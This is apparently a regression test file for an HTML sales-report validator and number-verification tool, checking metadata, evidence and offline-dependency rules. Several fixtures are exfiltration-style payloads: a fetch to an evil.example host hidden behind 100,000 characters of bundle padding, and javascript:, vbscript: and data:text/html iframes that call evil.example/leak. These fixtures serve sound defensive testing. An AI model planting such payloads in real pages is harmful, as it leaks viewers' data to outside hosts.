#!/usr/bin/env node
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { createHash } from 'crypto';
import { tmpdir } from 'os';
import { dirname, join, resolve } from 'path';
import { spawnSync } from 'child_process';
import { fileURLToPath } from 'url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..');
const VALIDATOR = join(ROOT, 'scripts', 'validate-report.mjs');
const VERIFY = join(ROOT, 'scripts', 'verify-numbers.mjs');
const EVAL_RUNNER = join(ROOT, 'scripts', 'run-evals.mjs');
const temp = mkdtempSync(join(tmpdir(), 'south-china-report-tests-'));
let passed = 0;

function run(script, args) {
  return spawnSync('node', [script, ...args], { cwd: ROOT, encoding: 'utf8' });
}

function assert(condition, message, detail = '') {
  if (!condition) {
    console.error('FAIL: ' + message);
    if (detail) console.error(detail);
    rmSync(temp, { recursive: true, force: true });
    process.exit(1);
  }
  passed++;
  console.log('PASS: ' + message);
}

function write(name, content) {
  const path = join(temp, name);
  writeFileSync(path, content);
  return path;
}

const tokens = Array.from({ length: 41 }, (_, i) => '--t' + i + ':' + i + ';').join('');
const defaultMeta = {
  schema_version: '1.0',
  generator: { name: 'south-china-report', version: '3.2.0' },
  requested_period: '2025-12',
  source: {
    path: 'evals/fixtures/sales-2024-2025.csv',
    sha256: '27547dddb3bd182642f9551b8876acdf2411009f8c890217f7d8b1442fb3092d',
  },
  report_mode: 'regression-fixture',
  data_cutoff: {
    data_as_of: '2025-12-31', comparison_as_of: '2024-12-31',
    completeness: 'complete', like_for_like: true,
  },
  key_metrics: { 'period.total_cur_wan': 172.0 },
  metrics_sha256: 'a'.repeat(64),
  insights_sha256: 'b'.repeat(64),
};
const defaultEvidence = {
  version: 1,
  claims: [{ id: 'E-REGRESSION', kind: 'fact', sources: [{ file: 'metrics', path: 'period.total_cur_wan' }] }],
};
function report(extraHead = '', extraBody = '', extraScript = '', meta = defaultMeta, evidence = defaultEvidence) {
  const metaScript = meta
    ? '<script type="application/json" id="south-china-report-meta">' + JSON.stringify(meta) + '</script>'
    : '';
  const evidenceScript = evidence
    ? '<script type="application/json" id="south-china-report-evidence-contract">' + JSON.stringify(evidence) + '</script>'
    : '';
  return '<!doctype html><html data-density="compact"><head><meta charset="utf-8">' +
    '<style>:root{' + tokens +
    '--font-display:sans-serif;--font-editorial:sans-serif;--font-data:monospace}' +
    '.num,.kpi-value,[data-metric]{font-variant-numeric:tabular-nums}' +
    '</style>' + extraHead + metaScript + evidenceScript + '</head><body>' +
    '<h1 class="hero-title" data-evidence-id="E-REGRESSION">结构改善带动增长</h1>' +
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">收入企稳，结构改善</h2>' +
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">区域分化，需要聚焦</h2>' +
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">渠道修复，效率优先</h2>' +
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">动作明确，责任到位</h2>' +
    '<span class="num" data-metric="period.total_cur_wan">172.0</span>' +
    '<span class="num" data-metric="period.qty_cur">577</span>' +
    '<span class="num" data-metric="period.total_yoy">-2.2%</span>' +
    extraBody + '<script>' + extraScript + '</script></body></html>';
}

try {
  const placeholder = write('placeholder.html', report('', '<p>[期间]</p>'));
  let result = run(VALIDATOR, [placeholder]);
  assert(result.status === 1 && result.stdout.includes('成品占位符'), '成品模式阻断占位符', result.stdout + result.stderr);
  result = run(VALIDATOR, [placeholder, '--template-mode']);
  assert(result.status === 0, '--template-mode 显式放行模板占位符', result.stdout + result.stderr);

  const inlineChapterTitle = write('inline-chapter-title.html', report().replace(
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">收入企稳，结构改善</h2>',
    '<h2 class="chapter-title" data-evidence-id="E-REGRESSION">销售分析<span data-metric="period.qty_cur">577</span></h2>',
  ));
  result = run(VALIDATOR, [inlineChapterTitle]);
  assert(result.stdout.includes('Chapter 1 标题') && result.stdout.includes('Action Title') &&
    !result.stdout.includes('未检测到 .chapter-title'),
  'Chapter 标题解析不被内联 data-metric 元素绕过', result.stdout + result.stderr);

  const missingMeta = write('missing-meta.html', report('', '', '', null));
  result = run(VALIDATOR, [missingMeta]);
  assert(result.status === 1 && result.stdout.includes('报告元数据契约'),
    '成品模式阻断缺失报告 meta', result.stdout + result.stderr);

  const snapshotMeta = write('snapshot-meta.html', report('', '', '', {
    ...defaultMeta,
    requested_period: 'snapshot',
    report_mode: 'snapshot',
    data_cutoff: {
      data_as_of: null, comparison_as_of: null,
      completeness: 'snapshot', like_for_like: false,
    },
  }));
  result = run(VALIDATOR, [snapshotMeta]);
  assert(result.status === 0,
    'snapshot meta 用显式 null 表达无业务日期并通过校验', result.stdout + result.stderr);

  const fakeSnapshotDate = write('snapshot-fake-date.html', report('', '', '', {
    ...defaultMeta,
    requested_period: 'snapshot',
    report_mode: 'snapshot',
    data_cutoff: {
      data_as_of: '2025-12-31', comparison_as_of: null,
      completeness: 'snapshot', like_for_like: false,
    },
  }));
  result = run(VALIDATOR, [fakeSnapshotDate]);
  assert(result.status === 1 && result.stdout.includes('禁止伪造业务日期'),
    'snapshot meta 阻断伪造业务日期', result.stdout + result.stderr);

  const duplicateMetaScript = '<script type="application/json" id="south-china-report-meta">' +
    JSON.stringify(defaultMeta) + '</script>';
  const duplicateMeta = write('duplicate-meta.html', report(duplicateMetaScript));
  result = run(VALIDATOR, [duplicateMeta]);
  assert(result.status === 1 && result.stdout.includes('出现 2 次'),
    '成品模式阻断重复报告 meta', result.stdout + result.stderr);

  const auditPass = write('audit-pass.html', report('',
    '<div class="audit-container"><span class="status-dot pass">PASS</span></div>'));
  result = run(VALIDATOR, [auditPass]);
  assert(result.status === 1 && result.stdout.includes('data-audit-finalized'),
    '成品模式阻断未经确认的审计 PASS/MATCH', result.stdout + result.stderr);
  const auditPassReordered = write('audit-pass-reordered.html', report('',
    '<div class="audit-container"><span class="pass status-dot">PASS</span></div>'));
  result = run(VALIDATOR, [auditPassReordered]);
  assert(result.status === 1 && result.stdout.includes('data-audit-finalized'),
    '审计 PASS 检测不受 class 顺序影响', result.stdout + result.stderr);
  const finalizedAudit = write('audit-finalized.html', readFileSync(auditPass, 'utf8')
    .replace('<html data-density="compact">', '<html data-density="compact" data-audit-finalized="true">'));
  result = run(VALIDATOR, [finalizedAudit]);
  assert(result.status === 0, '审计 PASS 需显式 data-audit-finalized=true 才放行', result.stdout + result.stderr);

  const placeholderMeta = write('placeholder-meta.html', report('', '', '', {
    requested_period: '[REQUESTED_PERIOD]',
    source: { path: '[SOURCE_PATH]', sha256: '[SOURCE_SHA256]' },
    report_mode: 'ready',
    key_metrics: { '[METRIC_PATH]': null },
  }));
  result = run(VALIDATOR, [placeholderMeta]);
  assert(result.status === 1 && result.stdout.includes('报告元数据契约') && result.stdout.includes('requested_period'),
    '可见正文已清理时仍阻断 meta JSON 占位值', result.stdout + result.stderr);

  const metricsHashPlaceholder = write('metrics-hash-placeholder.html', report('', '', '', {
    ...defaultMeta,
    metrics_sha256: '[METRICS_SHA256]',
  }));
  result = run(VALIDATOR, [metricsHashPlaceholder]);
  assert(result.status === 1 && result.stdout.includes('metrics_sha256'),
    '可选 metrics_sha256 一旦存在也必须实例化为 64 位指纹', result.stdout + result.stderr);

  const external = write('external.html', report(
    '<link rel="stylesheet" href="//cdn.example.com/a.css"><style>.hero{background:url(./hero.png)}</style>',
    '<img srcset="/a.png 1x, https://example.com/a@2x.png 2x">',
    "fetch('./metrics.json'); const s=document.createElement('script'); s.src='lib.js';"
  ));
  result = run(VALIDATOR, [external, '--strict-offline']);
  assert(result.status === 1 && result.stdout.includes('link[href]') && result.stdout.includes('CSS url()') &&
    result.stdout.includes('img[srcset]') && result.stdout.includes('fetch()'),
  'strict-offline 阻断远程、协议相对、相对和动态依赖', result.stdout + result.stderr);

  const modules = write('modules.html', report(
    '<script type="importmap">{"imports":{"pkg":"./pkg.js"}}</script>', '',
    "import './side.js'; import value from './dep.js'; export { value } from './reexport.js';"
  ));
  result = run(VALIDATOR, [modules, '--strict-offline']);
  assert(result.status === 1 && result.stdout.includes('importmap') && result.stdout.includes('side-effect import') &&
    result.stdout.includes('static import-from') && result.stdout.includes('export-from'),
  'strict-offline 阻断 importmap 与三类静态 ES module 依赖', result.stdout + result.stderr);

  const disguisedBundle = write('disguised-bundle.html', report('', '',
    '/* zrender */' + 'a'.repeat(100001) + ';fetch("https://evil.example/x")'));
  result = run(VALIDATOR, [disguisedBundle, '--strict-offline']);
  assert(result.status === 1 && result.stdout.includes('fetch()'),
    'strict-offline 不允许大脚本借 bundle 特征绕过字面依赖扫描', result.stdout + result.stderr);

  const activeScheme = write('active-scheme.html', report('',
    '<iframe src="javascript:fetch(\'https://evil.example/leak\')" title="probe"></iframe>' +
    '<object data="vbscript:msgbox(1)"></object>'));
  result = run(VALIDATOR, [activeScheme, '--strict-offline']);
  assert(result.status === 1 && result.stdout.includes('javascript:') && result.stdout.includes('vbscript:'),
    'strict-offline 阻断 javascript:/vbscript: 主动协议', result.stdout + result.stderr);

  const activeDataDocument = write('active-data-document.html', report('',
    '<iframe src="data:text/html,%3Cscript%3Efetch(\'https%3A%2F%2Fevil.example%2Fleak\')%3C%2Fscript%3E" title="probe"></iframe>' +
    '<embed src="data:image/svg+xml,%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E">' +
    '<object data="data:application/xml,%3Cprobe%2F%3E"></object>'));
  result = run(VALIDATOR, [activeDataDocument, '--strict-offline']);
  assert(result.status === 1 && result.stdout.includes('active data URI') && result.stdout.includes('data:text/html'),
    'strict-offline 阻断 iframe/embed/object 的主动 data: 文档', result.stdout + result.stderr);

  const banned = write('banned.html', report('', '', 'const option={\"series\":[{\"type\":\"pie\"}]};'));
  result = run(VALIDATOR, [banned]);
  assert(result.status === 0 && result.stdout.includes('检出 饼图/环形图'), '禁用图表检查覆盖带引号 JSON key', result.stdout + result.stderr);

  const unnamedContractEscape = write('arbitrary-chart-no-contract.html', report('',
    '<div id="salesGraph" style="height:180px"></div>',
    "echarts.init(document.getElementById('salesGraph'));"));
  result = run(VALIDATOR, [unnamedContractEscape]);
  assert(result.status === 1 && result.stdout.includes('ECharts 运行时合同') && result.stdout.includes('缺少唯一'),
    '任意命名的 echarts.init 也必须提供运行时合同', result.stdout + result.stderr);

  const missingEvidence = write('missing-evidence.html', report('', '', '', defaultMeta, null));
  result = run(VALIDATOR, [missingEvidence]);
  assert(result.status === 1 && result.stdout.includes('Evidence ID 证据合同') && result.stdout.includes('缺少唯一'),
    '成品模式阻断缺失 Evidence 合同', result.stdout + result.stderr);

  const unsupportedAttribution = {
    version: 1,
    claims: [{ id: 'E-REGRESSION', kind: 'attribution', sources: [] }],
  };
  const unsupportedAttributionReport = write('unsupported-attribution.html',
    report('', '', '', defaultMeta, unsupportedAttribution));
  result = run(VALIDATOR, [unsupportedAttributionReport]);
  assert(result.status === 1 && result.stdout.includes('必须绑定至少一个 sources 路径'),
    '无证据的因果归因不得冒充事实', result.stdout + result.stderr);

  const implicitHypothesis = {
    version: 1,
    claims: [{ id: 'E-REGRESSION', kind: 'hypothesis', reason: '待业务核实', validation_needed: '下周用事件记录复核' }],
  };
  const implicitHypothesisReport = write('implicit-hypothesis.html',
    report('', '', '', defaultMeta, implicitHypothesis));
  result = run(VALIDATOR, [implicitHypothesisReport]);
  assert(result.status === 1 && result.stdout.includes('data-claim-kind="hypothesis"'),
    '无数据支撑的原因必须在 DOM 显式标注 hypothesis', result.stdout + result.stderr);

  const metricFile = write('metrics.json', JSON.stringify({ period: { total_cur_wan: 172.0 } }));
  const verifyBad = write('verify-bad.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span><p>同比 -2.2%</p></body></html>');
  result = run(VERIFY, [verifyBad, metricFile]);
  assert(result.status === 1 && result.stderr.includes('未绑定且未豁免'), 'verify-numbers 阻断未绑定可见数字', result.stdout + result.stderr);
  const verifyGood = write('verify-good.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span>' +
    '<p data-number-exempt="期间标签">2025-12</p></body></html>');
  result = run(VERIFY, [verifyGood, metricFile]);
  assert(result.status === 0 && result.stdout.includes('覆盖率 100.0%') &&
    result.stdout.includes('不覆盖 JavaScript 运行时注入'),
    'verify-numbers 支持显式豁免、输出覆盖率并声明静态边界', result.stdout + result.stderr);

  const ariaHidden = write('verify-aria-hidden.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span>' +
    '<span aria-hidden="true">999</span></body></html>');
  result = run(VERIFY, [ariaHidden, metricFile]);
  assert(result.status === 1 && result.stderr.includes('未绑定且未豁免'),
    'verify-numbers 不将 aria-hidden 误当作视觉隐藏', result.stdout + result.stderr);

  const cssHidden = write('verify-css-hidden.html',
    '<!doctype html><html><head><style>.visually-removed{display:none}</style></head><body>' +
    '<span data-metric="period.total_cur_wan">172.0</span><span class="visually-removed">999</span></body></html>');
  result = run(VERIFY, [cssHidden, metricFile]);
  assert(result.status === 0 && result.stdout.includes('覆盖率 100.0%'),
    'verify-numbers 识别顶层简单 CSS display:none 视觉隐藏', result.stdout + result.stderr);

  const exemptLarge = write('verify-exempt-large.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span>' +
    '<div data-number-exempt="期间标签">2025-12</div></body></html>');
  result = run(VERIFY, [exemptLarge, metricFile]);
  assert(result.status === 1 && result.stderr.includes('大容器'), 'verify-numbers 阻断在大容器上豁免数字', result.stdout + result.stderr);

  const exemptEmpty = write('verify-exempt-empty.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span>' +
    '<span data-number-exempt="">2025-12</span></body></html>');
  result = run(VERIFY, [exemptEmpty, metricFile]);
  assert(result.status === 1 && result.stderr.includes('理由不能为空'), 'verify-numbers 阻断空豁免理由', result.stdout + result.stderr);

  const exemptMultiple = write('verify-exempt-multiple.html',
    '<!doctype html><html><body><span data-metric="period.total_cur_wan">172.0</span>' +
    '<p data-number-exempt="章节序号"><span>2025</span><span>12</span></p></body></html>');
  result = run(VERIFY, [exemptMultiple, metricFile]);
  assert(result.status === 1 && result.stderr.includes('2 个独立数字'),
    'verify-numbers 阻断单个豁免元素吞掉多个数字', result.stdout + result.stderr);

  const emptyMetrics = write('empty-metrics.json', '{}');
  const prototypePath = write('verify-prototype-path.html',
    '<!doctype html><html><body><span data-metric="constructor.length">1</span></body></html>');
  result = run(VERIFY, [prototypePath, emptyMetrics]);
  assert(result.status === 1 && result.stderr.includes('metrics.json 无此有限数值'),
    'verify-numbers 禁止通过原型链伪造 metrics 命中', result.stdout + result.stderr);

  const provenanceMetricsText = JSON.stringify({
    period: { total_cur_wan: 172.0, qty_cur: 577, total_yoy: -2.2 },
  });
  const provenanceMetrics = write('provenance-metrics.json', provenanceMetricsText);
  const provenanceMetricsSha = createHash('sha256').update(provenanceMetricsText).digest('hex');
  const provenanceInsightsText = JSON.stringify({
    schema_version: '1.0',
    meta: { metrics_sha256: provenanceMetricsSha },
    trend_test: { mann_kendall: { z: -2.1 } },
  });
  const provenanceInsights = write('provenance-insights.json', provenanceInsightsText);
  const provenanceInsightsSha = createHash('sha256').update(provenanceInsightsText).digest('hex');
  const provenanceMeta = {
    ...defaultMeta,
    metrics_sha256: provenanceMetricsSha,
    insights_sha256: provenanceInsightsSha,
  };
  const provenanceReport = write('verify-provenance.html', report('', '', '', provenanceMeta));
  result = run(VERIFY, [provenanceReport, provenanceMetrics, '--insights', provenanceInsights]);
  assert(result.status === 0 && result.stdout.includes('数字一致性与可见数字覆盖率均通过'),
    'verify-numbers 通过 report→insights→metrics 双哈希强绑定', result.stdout + result.stderr);

  const staleMetricsReport = write('verify-stale-metrics.html', report('', '', '', {
    ...provenanceMeta,
    metrics_sha256: '0'.repeat(64),
  }));
  result = run(VERIFY, [staleMetricsReport, provenanceMetrics, '--insights', provenanceInsights]);
  assert(result.status === 1 && result.stderr.includes('报告 metrics_sha256'),
    'verify-numbers 阻断报告绑定的旧 metrics 指纹', result.stdout + result.stderr);

  const badEvidence = {
    version: 1,
    claims: [{ id: 'E-REGRESSION', kind: 'fact', sources: [{ file: 'metrics', path: 'period.not_found' }] }],
  };
  const badEvidenceReport = write('verify-bad-evidence.html',
    report('', '', '', provenanceMeta, badEvidence));
  result = run(VERIFY, [badEvidenceReport, provenanceMetrics, '--insights', provenanceInsights]);
  assert(result.status === 1 && result.stderr.includes('Evidence 路径不存在或为空'),
    'verify-numbers 阻断 Evidence ID 引用不存在的真源路径', result.stdout + result.stderr);

  const sourceHash = '27547dddb3bd182642f9551b8876acdf2411009f8c890217f7d8b1442fb3092d';
  const correctMeta = {
    ...defaultMeta,
    requested_period: '2025-12',
    source: { path: 'evals/fixtures/sales-2024-2025.csv', sha256: sourceHash },
    report_mode: 'compact-monthly',
    key_metrics: { 'period.total_cur_wan': 172.0, 'period.qty_cur': 577, 'period.total_yoy': -2.2 },
  };
  const correctReport = write('eval-correct.html', report('', '', '', correctMeta));
  result = run(EVAL_RUNNER, [correctReport, '--eval', '1']);
  assert(result.status === 0 && result.stdout.includes('DOM class .chapter-title 为 4'),
    'eval 使用真实 DOM 和报告契约通过正确期间', result.stdout + result.stderr);

  const withoutVisibleChapters = report('', '', '', correctMeta)
    .replace(/<h2 class="chapter-title"[^>]*>[\s\S]*?<\/h2>/g, '');
  const templateOnlyChapters = write('eval-template-only-chapters.html', withoutVisibleChapters
    .replace('<body>', '<body><template>' + '<h2 class="chapter-title">伪章节</h2>'.repeat(4) + '</template>'));
  result = run(EVAL_RUNNER, [templateOnlyChapters, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('DOM class .chapter-title 为 0'),
    'eval DOM 计数排除 template 内容', result.stdout + result.stderr);

  const wrongMeta = { ...correctMeta, requested_period: '2026H1' };
  const wrongReport = write('eval-wrong-period.html', report('', '', '', wrongMeta));
  result = run(EVAL_RUNNER, [wrongReport, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('requested_period'),
    'eval 阻断错误年份/期间报告', result.stdout + result.stderr);

  const wrongDisplay = write('eval-wrong-display.html', report('', '', '', correctMeta)
    .replace('data-metric="period.total_cur_wan">172.0', 'data-metric="period.total_cur_wan">999.0'));
  result = run(EVAL_RUNNER, [wrongDisplay, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('报告 DOM 中 period.total_cur_wan'),
    'eval 阻断 meta 正确但页面关键指标错误的报告', result.stdout + result.stderr);

  const duplicateVisible = write('eval-duplicate-visible.html', report('',
    '<span class="num" data-metric="period.total_cur_wan">999.0</span>', '', correctMeta));
  result = run(EVAL_RUNNER, [duplicateVisible, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('存在值不匹配'),
    'eval 要求同一关键指标的所有可见副本一致', result.stdout + result.stderr);

  const hiddenCorrectVisibleWrong = write('eval-hidden-correct.html', report('', '', '', correctMeta)
    .replace('<span class="num" data-metric="period.total_cur_wan">172.0</span>',
      '<span class="num" data-metric="period.total_cur_wan" hidden>172.0</span>' +
      '<span class="num" data-metric="period.total_cur_wan">999.0</span>'));
  result = run(EVAL_RUNNER, [hiddenCorrectVisibleWrong, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('period.total_cur_wan'),
    'eval 不允许隐藏的正确数字掩盖可见错值', result.stdout + result.stderr);

  const wrongSourceMeta = { ...correctMeta, source: { ...correctMeta.source, sha256: '0'.repeat(64) } };
  const wrongSource = write('eval-wrong-source.html', report('', '', '', wrongSourceMeta));
  result = run(EVAL_RUNNER, [wrongSource, '--eval', '1']);
  assert(result.status === 1 && result.stdout.includes('source.sha256'),
    'eval 阻断源文件指纹不一致的报告', result.stdout + result.stderr);

  console.log('\n' + passed + ' regression checks passed.');
} finally {
  rmSync(temp, { recursive: true, force: true });
}
